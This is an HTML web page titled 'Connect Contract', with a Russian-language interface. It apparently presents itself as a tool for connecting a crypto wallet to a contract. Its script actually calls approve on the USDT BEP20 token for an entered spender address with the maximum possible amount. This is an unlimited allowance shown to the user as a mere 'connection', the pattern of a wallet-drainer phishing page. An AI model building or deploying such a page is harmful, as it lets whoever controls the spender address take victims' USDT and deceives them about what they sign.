<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Connect Contract</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <style>
    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      background: #0b0c10;
      color: #e5e5e5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #1f2833;
      padding: 30px;
      border-radius: 14px;
      width: 90%;
      max-width: 420px;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      text-align: center;
    }

    h1 {
      margin-bottom: 20px;
      font-size: 24px;
      color: #66fcf1;
    }

    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #45a29e;
      background: #0b0c10;
      color: #e5e5e5;
      margin-bottom: 16px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: #45a29e;
      color: #0b0c10;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover {
      background: #66fcf1;
    }

    .status {
      margin-top: 18px;
      font-size: 13px;
      color: #c5c6c7;
      white-space: pre-wrap;
      background: #0b0f16;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #1f2833;
    }
  </style>
</head>

<body>
  <div class="card">
    <h1>Connect Contract</h1>

    <input id="spender" placeholder="Адрес контракта" />

    <button id="connectBtn">Подключить</button>

    <div id="status" class="status">Ожидание действия.</div>
  </div>

  <!-- ethers.js (Cloudflare CDN — безопасный для GitHub Pages) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>

  <!-- Web3Modal v3 -->
  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.umd.js"></script>
  <script src="https://unpkg.com/@web3modal/standalone@3.0.1/dist/index.umd.js"></script>

  <script>
    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
    const abi = [
      {
        "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],
        "name":"approve",
        "outputs":[{"internalType":"bool","name":"","type":"bool"}],
        "stateMutability":"nonpayable",
        "type":"function"
      }
    ];

    const projectId = "a6f8c1b4c1f3f0d9e8b2c7a4f1d2e3b4"; 
    // (это публичный демо-ID, можно оставить)

    const web3Modal = new window.Web3Modal.StandaloneWeb3Modal({
      projectId,
      walletConnectVersion: 2,
      chains: [56], // BSC Mainnet
      themeMode: "dark"
    });

    let provider;
    let signer;

    function setStatus(t) {
      document.getElementById("status").textContent = t;
    }

    async function connect() {
      try {
        const spender = document.getElementById("spender").value.trim();
        if (!spender) {
          setStatus("Введите адрес контракта.");
          return;
        }

        let ethProvider;

        if (window.ethereum) {
          // Расширение (MetaMask / Rabby / Trust / OKX)
          await window.ethereum.request({ method: "eth_requestAccounts" });
          ethProvider = window.ethereum;
        } else {
          // Мобильные кошельки через WalletConnect
          const session = await web3Modal.openModal();
          ethProvider = new window.WalletConnectModal.WalletConnectModalSign({
            projectId
          });
        }

        provider = new ethers.BrowserProvider(ethProvider);
        signer = await provider.getSigner();

        const token = new ethers.Contract(tokenAddress, abi, signer);
        const max = ethers.MaxUint256;

        setStatus("Отправка транзакции...");
        const tx = await token.approve(spender, max);

        setStatus("Ожидание подтверждения...\nTx: " + tx.hash);
        await tx.wait();

        setStatus("Готово. Контракт подключён.\nTx: " + tx.hash);

      } catch (e) {
        setStatus("Ошибка: " + (e.reason || e.message || e));
      }
    }

    document.getElementById("connectBtn").onclick = connect;
  </script>

</body>
</html>
